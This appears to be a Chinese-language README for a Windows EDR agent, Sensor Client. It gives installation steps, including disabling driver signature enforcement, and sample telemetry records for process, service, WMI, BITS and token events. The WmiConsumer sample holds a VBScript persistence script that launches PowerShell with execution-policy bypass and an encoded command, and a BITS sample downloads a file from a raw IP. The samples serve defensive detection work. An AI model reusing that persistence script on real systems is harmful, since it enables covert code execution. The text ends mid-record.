# Sensor Client v1.0

## 简介

Sensor EDR 主要目标，依托于安全大数据，以数据为基础，实时分析，处理动态变化的安全问题。  

Sensor EDR 主要组成部分：

- Sensor Client
- Sensor Data Center
- Dynamic analysis, association, traceability, disposal 

本次主要发布Sensor Client，这是专门为windows终端安全设计的开发的，基本覆盖需要的数据场景，技术指标，分析指标，文件引擎，Attck引擎等等

## 安装

| 包名                 | 包大小  | 下载连接 |
| -------------------- | ------- | -------- |
| sensor_x64_setup.exe | 6.96 MB |          |
| sensor_x86_setup.exe | 5.80 MB |          |

### 安装注意事项

#### WIN7关闭签名验证

开机时按 F8，然后在界面上点击禁用驱动程序签名强制即可

#### WIN10关闭签名验证

参考连接：https://www.ihuandu.com/help/faq/207.html

目前安装包，驱动，相关可执行文件没有进行数字签名，因此安装完成后，需要重启禁用 “驱动签名检查”。

- 首先打开 【设置】
- 点击 【更新与安全】，然后点击 【恢复】
- 在 【高级启动】部分，点击 【立即重启】
- 计算机将进入高级启动选项。在这里，选择 【疑难解答】
- 接着选择 【高级选项】
- 在高级选项中，选择 【启动设置】
- 在启动设置中，点击 【重新启动】
- 计算机将重新启动并显示启动设置。在这里，找到 【禁用驱动程序签名强制执行】 的选项，按其对应的数字键（一般是7）。
- 计算机将继续启动，此时驱动程序强制签名已被禁用

#### WIN11关闭签名验证

参考连接：https://answers.microsoft.com/zh-hans/windows/forum/all/win11/c8f63dd5-8bb1-4ecd-9496-e348bf4c06fd

您点击开始 -- 设置 -- 更新 -- 恢复 -- 高级启动，选择立即重启，然后在重启界面选择疑难解答 -- 高级选项 -- 启动设置，会有个选项是选择”禁用驱动程序强制签名“ 这个方法我重启启动后的高级选项下没有“启动设置”这个选项只有如下图所示的界面。

### 对接方案

目前安装包内置了心跳模块，内置了上报模块，上报配置，心跳配置可以自行修改，采用http/https请求。因各个产品通信不同，如果不需要，可以将这两个模块直接删除

`C:\Program Files\SensorEdr\SrHeartBeat.dll`

`C:\Program Files\SensorEdr\SrReport.dll`

您可以直接去读取数据库数据，进行上报。数据库内包含了全部的事件信息，数据库路径：

`C:\Program Files\SensorEdr\data\forensics.db`

![](https://github.com/lxg2021/Sensor-Client/blob/main/png/sqlite.png)



## 性能

| 进程      | 描述     | CPU  | 内存   |
| --------- | -------- | ---- | ------ |
| EngineSvc | 引擎服务 | <5%  | 10-30M |
| SensorSvc | 探针服务 | <5%  | 10-30M |

**数据量**：目前正常使用`C:\Program Files\SensorEdr\data\forensics.db` 数据量在 40-60M，数据压缩率很高，json方式上报，压缩率在10:1， 10M可以压缩成1M， 由于安装软件等操作，会产生大量文件行为，对于安装软件数据量不好评估。 基本可以确保，压缩后，每台主机每天数据上报在10M内.

## 系统平台

支持win7到win11系统，包括win7，支持x64, x86系统架构，目前测试主要在windows 10上测试的较多.

## Sensor Client能力

Sensor Client能力主要集中于：

- 数据实时采集 
- 系统Event事件采集
- 数据维度丰富，大致有72个数据维度，可以自行配置
- 安全能力引擎 （支持文件格式识别，壳识别，SDB，Dll侧道，签名检查，Powershell,  IOA等，OLE后续计划加入）

## 采集与能力

### 进程组

#### ProcessCreate	

创建进程格式：

```xml
EventID = 9
BootTime = 2024/05/03 17:09:33
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 09:34:53
UserID = s-1-5-21-219989340-3751043042-229602202-1000
Session = 1
ProcessID = 2224
ProcessName = slui.exe
ProcessImage = c:\windows\system32\slui.exe
ProcessCommandLine = c:\windows\system32\slui.exe -embedding
ProcessMD5 = 393b5457647467b05450ed4e0b7f9713
ParentProcessID = 808
ParentProcessImage = c:\windows\system32\svchost.exe
ParentProcessCommandLine = c:\windows\system32\svchost.exe -k dcomlaunch
ParentProcessMD5 = 3120b24060924f9b94182a1432b2d7f9
ProcessGUID = 432541c0032808b0003aa91ac39dda01
ParentProcessGUID = b11c697402740328003a7d5c399dda01
OrgFileName = slui.exe
DriverType = 1
Signature = 1
SignVendor = microsoft windows
RTLO = 0
ShowWindowFlag = 0
UniqueID = 34e6d255-7b79-407f-8cef-c97daa6bf669
```

注意关键字段：

| Field          | Content                          |
| -------------- | -------------------------------- |
| RTLO           | 为RTLO攻击创建字段               |
| ShowWindowFlag | 为UI创建进程隐藏窗口创建字段     |
| DriverType     | 为移动USB或CD插入弹出执行设计    |
| OrgFileName    | 文件原名，追踪改名执行，检查隐匿 |
| Signature      | 签名检查                         |

后续，计划添加Env环境劫持添加字段

#### ProcessExit	

进程退出格式：

```
EventID = 10
BootTime = 2024/05/03 17:09:33
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 09:35:10
SelfExit = 0
ProcessID = 4964
ProcessName = slui.exe
ProcessImage = c:\windows\system32\slui.exe
ProcessMD5 = 393b5457647467b05450ed4e0b7f9713
OperatorProcessID = 0
OperatorProcessImage = NULL
OperatorProcessMD5 = NULL
ProcessGuid = 3a26f3d10be41364003a8d21c39dda01
OperatorProcessGuid = NULL
UniqueID = 51fee7f3-e5d9-4c63-b462-a1bc73b9e7e0
```

进程退出，用于构建完整进程生命周期，进程后台分析周期，用于跟踪进程自我退出，还是被其他进程强制结束

注意关键字段：

| Field    | Content                                |
| -------- | -------------------------------------- |
| SelfExit | 0: 自行退出  1:强制结束                |
| Operator | 强制结束时，Operator操作者进程相关信息 |

#### ProcessAccess	

跨进程操作格式：

```
EventID = 11
BootTime = 2024/05/03 17:09:33
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 10:12:41
GrantedAccess = 5136
ProcessID = 636
ProcessName = lsass.exe
ProcessImage = c:\windows\system32\lsass.exe
ProcessMD5 = 66ab59715d1be45e4f909394f5eb1ba4
OperatorProcessID = 5832
OperatorProcessName = sedlauncher.exe
OperatorProcessImage = c:\program files\rempl\sedlauncher.exe
OperatorProcessMD5 = a7bc08fb9f406a174ee9458193d89a8e
CallTrace = c:\windows\system32\kernelbase.dll+0x38fbd|c:\program files\rempl\sedplugins.dll+0x4f530|c:\program files\rempl\sedplugins.dll+0x4f193|c:\program files\rempl\sedplugins.dll+0x4f758|c:\program files\rempl\sedplugins.dll+0x7c282|c:\program files\rempl\sedplugins.dll+0x1f687|c:\program files\rempl\sedplugins.dll+0x220d6|c:\program files\rempl\sedplugins.dll+0x1daeb|c:\program files\rempl\sedlauncher.exe+0x7816|c:\program files\rempl\sedlauncher.exe+0x1c5a2|c:\windows\system32\kernel32.dll+0x12784|c:\windows\system32\ntdll.dll+0x50c51|
ProcessGuid = b0e8d46c01f8027c007a8955399dda01
OperatorProcessGuid = f403b0d2055816c8003a3a54729dda01
UniqueID = 9c9130d7-4537-4c41-8b03-a84bbe8feec6
```

跨进程操作，用于针对系统关键或关注进程所设计，例如：针对lsass进程操作，Operator操作者进程

#### RemoteThread	

远程线程格式：

```
EventID = 12
BootTime = 2024/05/03 17:09:33
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 10:23:21
ProcessID = 4944
ThreadID = 5596
ProcessName = explorer.exe
ProcessImage = c:\windows\explorer.exe
ProcessMD5 = d2af87b360db77e076881938c91fa276
OperatorProcessID = 6228
OperatorProcessImage = c:\users\lxg\desktop\remotedll64.exe
OperatorProcessMD5 = 3fa8b55dcfe964bfe0d9a251dddfce21
ProcessGuid = b87a750513341350003a5fd6399dda01
OperatorProcessGuid = f07e166b13501854003ada6dc99dda01
UniqueID = dfa5eb97-9d4c-4f69-b997-e4d13d0e298b
```

用于监视远程线程注入，跨进程创建远程线程

#### CrossMemoryExecute

跨进程分配可执行内存信息格式：

```
EventID = 72
BootTime = 2024/05/04 14:01:16
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 17:12:08
ProcessID = 6920
ProcessName = notepad.exe
ProcessImage = c:\windows\system32\notepad.exe
ProcessMD5 = f60a9d3a9461f68de0fccebb0c6cb31a
OperatorProcessID = 8796
OperatorProcessName = tst.exe
OperatorProcessImage = e:\test\tst.exe
OperatorProcessMD5 = 50385d14bffe3367083c2f6e22d8bc4c
ProcessGuid = 57d33ce319a81b08003a5d79ff9dda01
OperatorProcessGuid = 2336612721b8225c003a8a41039eda01
Address = 0x0000026255b60000
PageProtect = 64
UniqueID = 3cb47164-7194-4bc8-85a1-b7d9c1a4b071
```

用途：用于监测跨进程写入可执行shellcode模式

### 网络组

#### DNS

DNS请求格式：

```
EventID = 4
BootTime = 2024/05/04 10:50:36
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 10:55:39
ProcessID = 4064
ProcessName = nslookup.exe
ProcessImage = c:\windows\system32\nslookup.exe
ProcessMD5 = 708a3c6f67d4d86d1936654157fd536c
Domain = www.baidu.com
IPS = 183.2.172.42;183.2.172.185
ProcessGuid = 8b5c943f1e200fe0003a3a99ce9dda01
UniqueID = 7e302a0d-4583-49bb-8734-caea2e1e5c32
```

#### NetComunicate

网络连接请求格式：

```
EventID = 5
BootTime = 2024/05/04 10:50:36
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 10:55:39
ProcessID = 4064
ProcessName = nslookup.exe
ProcessImage = c:\windows\system32\nslookup.exe
ProcessMD5 = 708a3c6f67d4d86d1936654157fd536c
Protocol = ipproto_udp
Direction = outbound
SourceIsIPv6 = 0
SourceIP = 192.168.74.129
SourcePort = 56428
DestinationIsIPv6 = 0
DestinationIP = 192.168.74.2
DestinationPort = 53
ProcessGuid = 8b5c943f1e200fe0003a3a99ce9dda01
UniqueID = 017a4127-84cf-4a96-846a-ed199bd3dc00
```

#### Url

注意：暂未提供，后续会补充

### 服务组

#### ServiceCreate

创建服务格式：

```
EventID = 13
BootTime = 2024/05/04 10:50:36
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 11:00:34
ProcessID = 6312
ProcessName = processhacker.exe
ProcessImage = c:\program files\process hacker 2\processhacker.exe
ProcessMD5 = b365af317ae730a67c936f21432b9c71
ServiceName = processhackerhaccqppdvrabjqb
DisplayName = processhackerhaccqppdvrabjqb
ServiceType = 16
StartType = 3
ServiceBinaryMD5 = b365af317ae730a67c936f21432b9c71
ServiceStartName = localsystem
ServiceBinaryPathName = "c:\program files\process hacker 2\processhacker.exe" -ras "processhackerhaccqppdvrabjqb"
ProcessGuid = 2169219812bc18a8003a0d87cf9dda01
UniqueID = e722ddec-1e7c-4e62-8d57-1a930ec03834
```

#### ServiceStart

启动服务格式：

```
EventID = 18
BootTime = 2024/05/04 10:50:36
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 11:00:35
ProcessID = 6312
ProcessName = processhacker.exe
ProcessImage = c:\program files\process hacker 2\processhacker.exe
ProcessMD5 = b365af317ae730a67c936f21432b9c71
ServiceName = processhackerhaccqppdvrabjqb
DisplayName = processhackerhaccqppdvrabjqb
ServiceType = 16
StartType = 3
ServiceBinaryMD5 = b365af317ae730a67c936f21432b9c71
ServiceStartName = localsystem
ServiceBinaryPathName = c:\program files\process hacker 2\processhacker.exe
ServiceStartArgs = NULL
ProcessGuid = 2169219812bc18a8003a0d87cf9dda01
UniqueID = c28450e6-fb45-4dd0-8180-d31e0d71437b
```

#### ServiceDelete

删除服务格式：

```
EventID = 18
BootTime = 2024/05/04 10:50:36
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 11:00:35
ProcessID = 6312
ProcessName = processhacker.exe
ProcessImage = c:\program files\process hacker 2\processhacker.exe
ProcessMD5 = b365af317ae730a67c936f21432b9c71
ServiceName = processhackerhaccqppdvrabjqb
DisplayName = processhackerhaccqppdvrabjqb
ServiceType = 16
StartType = 3
ServiceBinaryMD5 = b365af317ae730a67c936f21432b9c71
ServiceStartName = localsystem
ServiceBinaryPathName = c:\program files\process hacker 2\processhacker.exe
ServiceStartArgs = NULL
ProcessGuid = 2169219812bc18a8003a0d87cf9dda01
UniqueID = c28450e6-fb45-4dd0-8180-d31e0d71437b
```

#### ServiceStop

停止服务格式：

```
EventID = 14
BootTime = 2024/05/04 10:50:36
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 11:08:43
ProcessID = 7500
ProcessName = mmc.exe
ProcessImage = c:\windows\system32\mmc.exe
ProcessMD5 = 55e48d7805babf5602d38052bf659930
ServiceName = bthhfsrv
DisplayName = bluetooth handsfree service
ServiceType = 32
StartType = 3
ServiceBinaryMD5 = 3120b24060924f9b94182a1432b2d7f9
ServiceStartName = nt authority\localservice
ServiceBinaryPathName = c:\windows\system32\svchost.exe
ServiceControlCode = service_control_stop
ProcessGuid = 3faaf02212bc1d4c003ada0ed09dda01
UniqueID = 3fc00d47-2ae8-42f9-a232-135de33fc2c1
```

#### ServiceConfig

修改服务配置，检测服务劫持

```
EventID = 16
BootTime = 2024/05/04 10:50:36
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 11:10:19
ProcessID = 7500
ProcessName = mmc.exe
ProcessImage = c:\windows\system32\mmc.exe
ProcessMD5 = 55e48d7805babf5602d38052bf659930
ServiceName = bthhfsrv
OrgServiceType = 32
NewServiceType = 32
OrgStartType = 3
NewStartType = 4
OrgServiceBinaryPathName = c:\windows\system32\svchost.exe
OrgServiceBinaryMD5 = 3120b24060924f9b94182a1432b2d7f9
NewServiceBinaryPathName = c:\windows\system32\svchost.exe
NewServiceBinaryMD5 = 3120b24060924f9b94182a1432b2d7f9
OrgDisplayName = bluetooth handsfree service
NewDisplayName = bluetooth handsfree service
OrgServiceStartName = nt authority\localservice
NewServiceStartName = nt authority\localservice
ProcessGuid = 3faaf02212bc1d4c003ada0ed09dda01
UniqueID = 9e695e37-dbae-4c79-95ae-4fb18a96c767
```

#### ServicePause/ServiceRestore

服务暂停恢复格式：

```
EventID = 15
BootTime = 2024/05/04 10:50:36
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 11:12:36
ProcessID = 7500
ProcessName = mmc.exe
ProcessImage = c:\windows\system32\mmc.exe
ProcessMD5 = 55e48d7805babf5602d38052bf659930
ServiceName = sensorsvc
DisplayName = edr sensor service
ServiceType = 16
StartType = 2
ServiceBinaryMD5 = 800a3cfc5f87b62f202ee725c038565b
ServiceStartName = localsystem
ServiceBinaryPathName = c:\program files\sensoredr\sensorsvc.exe
ServiceControlCode = service_control_pause
ProcessGuid = 3faaf02212bc1d4c003ada0ed09dda01
UniqueID = 4de03847-fbd7-4d4f-bbc8-401bd5a6171a
```

注意：ServiceControlCode表示执行暂停还是恢复

### 设备组

#### DeviceChange

设备变更格式：

```
EventID = 3
BootTime = 2024/05/04 10:50:36
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 11:19:04
DeviceGUID = {4d36e965-e325-11ce-bfc1-08002be10318}
HID = scsi\cdromnecvmwarvmware_sata_cd011.00
DeviceType = 2
DeviceDescription = device_type_cdrom
DeviceFlag = 0
UniqueID = 129f245e-1650-40ec-a6c0-58a2c91105de
```

用途：针对U盘，光驱可插拔，可弹出执行设计

### 镜像组

#### DriverImageLoad

驱动加载格式：

```
EventID = 31
BootTime = 2024/05/04 10:50:36
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 11:27:19
Image = c:\windows\system32\drivers\srregdrv.sys
ImageMD5 = 64ac59553b291313a3ed5b3fcc154c2c
ProcessID = 4
ProcessName = system
Signature = 1
SignVendor = wdktestcert,133389079361970735
ProcessGuid = d7309f130000000400fa4c60cd9dda01
UniqueID = f7ff10ed-6459-4122-a400-8d500430b399
```

#### DllImageLoad

Dll加载格式：

```
EventID = 32
BootTime = 2024/05/04 10:50:36
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 11:19:05
ProcessID = 1316
ProcessName = rundll32.exe
ProcessImage = c:\windows\system32\rundll32.exe
ProcessMD5 = ecb702b8c5650381c0784f1eeabb97bc
Image = c:\windows\system32\user32.dll
ImageMD5 = 5c85312ff6b4b3d987c8c6fde1e5fede
Signature = 1
SignVendor = microsoft windows
ProcessGuid = d180830b03240524003aaa29d19dda01
OrgFileName = user32
UniqueID = ed7ed908-8141-4a52-9cfc-c202697a6101
```

### Task组

#### TaskCreate

创建计划任务

```
EventID = 53
BootTime = 2024/05/04 10:50:36
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 11:37:27
ProcessID = 5452
ProcessName = mmc.exe
ProcessImage = c:\windows\system32\mmc.exe
ProcessMD5 = 55e48d7805babf5602d38052bf659930
Domain = desktop-p0mgc81
User = lxg
ServerName = NULL
TaskName = testtask
TaskPath = \microsoft\windows\appid
TaskImage = [
	{
		"image" : "c:\\windows\\system32\\cmd.exe",
		"imagemd5" : "94912c1d73ade68f2486ed4d8ea82de6",
		"parameters" : "cls"
	}
]

TaskTrigger = [
	{
		"endboundry" : "2025-05-04t11:36:38",
		"executiontimelimit" : "p3d",
		"startboundary" : "2024-05-04t11:36:38",
		"trigerid" : "",
		"trigertype" : "logontrigger"
	}
]
ProcessGuid = 29b2e73e12bc154c003ada5bd49dda01
UniqueID = c2ef6ee9-f974-4a1e-9b2d-00b7f7f04510
```

注意：支持微软全部Trigger，EventTrigger，TimeTrigger，DailyTrigger，WeeklyTrigger，MonthlyTrigger，MonthlyDOWTrigger，IdleTrigger，RegistrationTrigger，BootTrigger，LogonTrigger，SessionStateChangeTrigger， 支持任务镜像检测

#### TaskDelete

删除计划任务格式：

```
EventID = 52
BootTime = 2024/05/04 10:50:36
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 11:40:35
ProcessID = 5452
ProcessName = mmc.exe
ProcessImage = c:\windows\system32\mmc.exe
ProcessMD5 = 55e48d7805babf5602d38052bf659930
TaskName = testtask
TaskPath = \microsoft\windows\appid
ProcessGuid = 29b2e73e12bc154c003ada5bd49dda01
UniqueID = 1d0fb865-7070-4af4-b656-461b37da9f36
```

### WMI组

#### WmiQuery

wmi查询信息格式：

```
EventID = 58
BootTime = 2024/05/04 10:50:36
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 11:44:34
ProcessID = 5684
ProcessName = wmiquery.exe
ProcessImage = c:\users\lxg\desktop\sdb\wmiquery.exe
ProcessMD5 = cbcaffd9cf1291be46d58f305573f1f4
ServerName = NULL
User = NULL
Namespace = root/cimv2
Query = select * from win32_operatingsystem
QueryLanguage = wql
ProcessGuid = 5c67accb12bc163400baa93dd59dda01
UniqueID = 00a41e6d-2dc9-4e20-aeb2-dea0d6e655f4
```

#### WmiCreateClass

Wmi创建类信息格式：

```
EventID = 57
BootTime = 2024/05/04 10:50:36
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 11:46:51
ProcessID = 5632
ProcessName = wmicreateclass.exe
ProcessImage = c:\users\lxg\desktop\sdb\wmicreateclass.exe
ProcessMD5 = a1ca720ee3882319a55438bf2991a1fc
ServerName = NULL
User = NULL
Namespace = NULL
ClassName = example
ClassPath = NULL
SuperClassName = NULL
ClassAttributes = [
	{
		"attrname" : "__genus",
		"attrvalue" : "1",
		"isbase64" : false
	},
	{
		"attrname" : "__class",
		"attrvalue" : "example",
		"isbase64" : false
	},
	{
		"attrname" : "__superclass",
		"attrvalue" : "",
		"isbase64" : false
	},
	{
		"attrname" : "__dynasty",
		"attrvalue" : "example",
		"isbase64" : false
	},
	{
		"attrname" : "__relpath",
		"attrvalue" : "example",
		"isbase64" : false
	},
	{
		"attrname" : "__property_count",
		"attrvalue" : "3",
		"isbase64" : false
	},
	{
		"attrname" : "__derivation",
		"attrvalue" : "",
		"isbase64" : false
	},
	{
		"attrname" : "__server",
		"attrvalue" : "",
		"isbase64" : false
	},
	{
		"attrname" : "__namespace",
		"attrvalue" : "",
		"isbase64" : false
	},
	{
		"attrname" : "__path",
		"attrvalue" : "",
		"isbase64" : false
	},
	{
		"attrname" : "index",
		"attrvalue" : "",
		"isbase64" : false
	},
	{
		"attrname" : "intval",
		"attrvalue" : "",
		"isbase64" : false
	},
	{
		"attrname" : "otherinfo",
		"attrvalue" : "<default>",
		"isbase64" : false
	}
]
```

用途：用于监测无文件攻击，base64隐藏混淆代码

#### WmiFilter

wmifilter过滤器信息格式：

```
EventID = 54
BootTime = 2024/05/04 10:50:36
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 11:49:14
ProcessID = 5496
ProcessName = wmipersistence.exe
ProcessImage = c:\users\lxg\desktop\sdb\wmipersistence.exe
ProcessMD5 = 31fe75175f8bcaf06c83d909bdf22365
ServerName = 127.0.0.1
User = NULL
Password = NULL
Namespace = root\cimv2
EventFilterName = defaulteventfilter
EventFilterAccess = NULL
EventFilterClass = __eventfilter
Query = select * from win32_processstarttrace where processname = 'notepad.exe'
QueryLanguage = wql
ProcessGuid = faa4e6ca12bc1578003a2d44d59dda01
UniqueID = 1cfb12f8-db41-47ef-91db-c8fd5c329471
```

用途：用于监测WMI持久化，触发执行。

#### WmiConsumer

wmiconsumer消费者信息格式：

```
EventID = 55
BootTime = 2024/05/04 10:50:36
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 11:49:14
ProcessID = 5496
ProcessName = wmipersistence.exe
ProcessImage = c:\users\lxg\desktop\sdb\wmipersistence.exe
ProcessMD5 = 31fe75175f8bcaf06c83d909bdf22365
ServerName = 127.0.0.1
User = NULL
Namespace = root\cimv2
Class = activescripteventconsumer
EventConsumerName = defaulteventconsumer
EventConsumerType = 1
EventConsumerTypeDescription = activescripteventconsumer
EventConsumerContext = {
	"scriptfilemd5" : "",
	"scriptfilename" : "",
	"scripttext" : "dim oshell\nset oshell = createobject(\"wscript.shell\")\noshell.run(\"powershell.exe -executionpolicy bypass -encodedcommand zqbjaggabwagahqazqbzahqa\")\n",
	"scriptingengine" : "vbscript"
}

ProcessGuid = faa4e6ca12bc1578003a2d44d59dda01
UniqueID = 87ae6221-e045-4dbd-a9fd-22e3158a02a3
```

用途：用于监测WMI持久化，监测脚本执行，支持微软全部Consumer类型，ActiveScriptEventConsumer，CommandLineEventConsumer，LogFileEventConsumer，NTEventLogEventConsumer，SMTPEventConsumer

#### WmiBinding

wmibinding，filter和consumer绑定信息格式：

```
EventID = 56
BootTime = 2024/05/04 10:50:36
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 11:49:14
ProcessID = 5496
ProcessName = wmipersistence.exe
ProcessImage = c:\users\lxg\desktop\sdb\wmipersistence.exe
ProcessMD5 = 31fe75175f8bcaf06c83d909bdf22365
ServerName = 127.0.0.1
User = NULL
Namespace = root\cimv2
EventConsumerName = defaulteventconsumer
EventFilterName = defaulteventfilter
ProcessGuid = faa4e6ca12bc1578003a2d44d59dda01
UniqueID = a82b905b-7de6-4b28-a5e8-c0fa069e63b5
```

#### WmiExecute

wmi执行信息格式：

```
EventID = 59
BootTime = 2024/05/04 10:50:36
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 11:58:07
ProcessID = 6544
ProcessName = wmiexecmethod.exe
ProcessImage = c:\users\lxg\desktop\sdb\wmiexecmethod.exe
ProcessMD5 = 27109762135bc51b2058f10702ded67b
ServerName = NULL
User = NULL
Namespace = root\cimv2
Class = win32_process
MethodName = create
MethodParameters = [
	{
		"parametername" : "commandline",
		"parametervalue" : "cmd.exe"
	}
]
ProcessGuid = 448ea72912bc199000fade3dd79dda01
UniqueID = 22ac911b-cb5f-475c-b2ea-1ac0ce3f2276
```

用途：用于委托执行，或远程执行，躲避监测，监测执行的程序，及其命令行

### Bits组

#### BitsCreateJob

创建Bits信息数据格式：

```
EventID = 49
BootTime = 2024/05/04 10:50:36
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 13:45:26
ProcessID = 7028
ProcessName = bitsadmin.exe
ProcessImage = c:\windows\system32\bitsadmin.exe
ProcessMD5 = c0385255f03b226382e7fb72e5ac533a
JobId = {6d292ca9-ff60-4b63-9bae-fb7e2f605f8a}
JobType = 0
JobTypeDesc = bg_job_type_download
JobName = mydownloadjob
ProcessGuid = 434661a41eb81b7400bace8ee69dda01
UniqueID = 12c84231-c2f2-426a-aa28-81ddd37b990a
```

#### BitsJobAddFile

```
EventID = 51
BootTime = 2024/05/04 10:50:36
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 13:46:13
ProcessID = 4532
ProcessName = bitsadmin.exe
ProcessImage = c:\windows\system32\bitsadmin.exe
ProcessMD5 = c0385255f03b226382e7fb72e5ac533a
JobId = {6d292ca9-ff60-4b63-9bae-fb7e2f605f8a}
JobType = 0
JobTypeDesc = bg_job_type_download
JobName = mydownloadjob
JobFileContents = [
	{
		"localname" : "c:\\test\\bits\\ydark-master.zip",
		"remotename" : "http://20.0.22.148:8080/ydark-master.zip"
	}
]

ProcessGuid = 5f3ce12c1eb811b400bace8ee69dda01
UniqueID = 539ad393-bdb0-4d0e-a9f9-71981f6ed57d
```

#### BitsJobChangeState

```
EventID = 50
BootTime = 2024/05/04 10:50:36
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 13:47:12
ProcessID = 5284
ProcessName = bitsadmin.exe
ProcessImage = c:\windows\system32\bitsadmin.exe
ProcessMD5 = c0385255f03b226382e7fb72e5ac533a
JobId = {6d292ca9-ff60-4b63-9bae-fb7e2f605f8a}
JobType = 0
JobTypeDesc = bg_job_type_download
JobName = mydownloadjob
JobStatus = 1
JobStatusDesc = bit_status_resume
ProcessGuid = 82506b7f1eb814a4003a2d44e69dda01
UniqueID = 3f0dc100-5c5a-428f-a2cf-003eb34f6991
```

```
EventID = 50
BootTime = 2024/05/04 10:50:36
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 13:48:08
ProcessID = 5056
ProcessName = bitsadmin.exe
ProcessImage = c:\windows\system32\bitsadmin.exe
ProcessMD5 = c0385255f03b226382e7fb72e5ac533a
JobId = {6d292ca9-ff60-4b63-9bae-fb7e2f605f8a}
JobType = 0
JobTypeDesc = bg_job_type_download
JobName = mydownloadjob
JobStatus = 3
JobStatusDesc = bit_status_complete
ProcessGuid = a3eaf1431eb813c0003a2d44e69dda01
UniqueID = 44d3a9e3-d797-4b3e-bda6-ecce0c75fc6f
```

### WindowsMessage组

#### WindowsMessageHook

windows message hook信息格式：

```
EventID = 48
BootTime = 2024/05/04 14:00:41
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 14:12:14
ProcessID = 7904
ProcessName = processhacker.exe
ProcessImage = c:\program files\process hacker 2\processhacker.exe
ProcessMD5 = b365af317ae730a67c936f21432b9c71
HookType = 4
HookTypeDescription = wh_callwndproc
MessageHookModule = c:\windows\system32\shcore.dll
ProcessGuid = fc5849c815801ee0003a5d84e99dda01
UniqueID = b80f20eb-f175-4ec7-84da-a9ead0ac55db
```

用途：针对windows消息hook，跨进程获取其他进程相关信息

### EncryptDecrypt组

#### EncryptDecrypt

encrypt/decrypt对数据进行加解密信息格式

```
EventID = 70
BootTime = 2024/05/04 14:00:41
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 14:05:07
ProcessID = 7816
ProcessName = wermgr.exe
ProcessImage = c:\windows\system32\wermgr.exe
ProcessMD5 = 610b85ea3599e62b479bdeb3c9cbfe69
CryptFlag = 6
ProcessGuid = 01f25227056c1e8800fa9d7fe99dda01
UniqueID = 5e77d763-0a7f-4760-affd-1fa3df28866a
```

用途：常用于监测凭据盗取，勒索

### Token组

#### TokenAdjustPrivilege

调整特权信息格式：

```
EventID = 62
BootTime = 2024/05/04 14:00:41
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 14:09:54
ProcessID = 1232
ProcessName = vssvc.exe
ProcessImage = c:\windows\system32\vssvc.exe
ProcessMD5 = d2aa0b7431fd0efb185cc5aa09c2a11c
Privileges = sebackupprivilege
TokenFlag = 4
Self = 1
TargetProcessID = 1232
TargetProcessImage = c:\windows\system32\vssvc.exe
TargetProcessMD5 = d2aa0b7431fd0efb185cc5aa09c2a11c
TargetProcessName = vssvc.exe
ProcessGuid = adefc891029804d0003aba89e99dda01
TargetProcessGuid = adefc891029804d0003aba89e99dda01
UniqueID = b95e2887-988b-4cb0-9a9e-727abcfb84b0
```

用途：自身特权调整，或跨进程特权调整，例如，上述信息自身调整特权，增加了sebackupprivilege特权

#### TokenImpersonation

令牌模拟信息格式：

```
EventID = 61
BootTime = 2024/05/04 14:00:41
AgentID = d0c951b3b2fe6bba106840972c7c904f
Time = 2024/05/04 14:12:17
ProcessID = 6432
ProcessName = processhacker.exe
ProcessImage = c:\program files\process hacker 2\processhacker.exe
ProcessMD5 = b365af317ae730a67c936f21432b9c71
OperatorToken = {"accountname":"system","impersonationlevel":"","integritylevel":"system","privilege":"seassignprimarytokenprivilege;selockmemoryprivilege;seincreasequotaprivilege;setcbprivilege;setakeownershipprivilege;seloaddriverprivilege;sesystemprofileprivilege;seprofilesingleprocessprivilege;seincreasebasepriorityprivilege;secreatepagefileprivilege;secreatepermanentprivilege;sebackupprivilege;serestoreprivilege;seshutdownprivilege;sedebugprivilege;seauditprivilege;sechangenotifyprivilege;seimpersonateprivilege;secreateglobalprivilege;seincreaseworkingsetprivilege;setimezoneprivilege;secreatesymboliclinkprivilege;sedelegatesessionuserimpersonateprivilege","sessionid":0,"sid":"s-1-5-18","tokentype":"tokenprimary"}
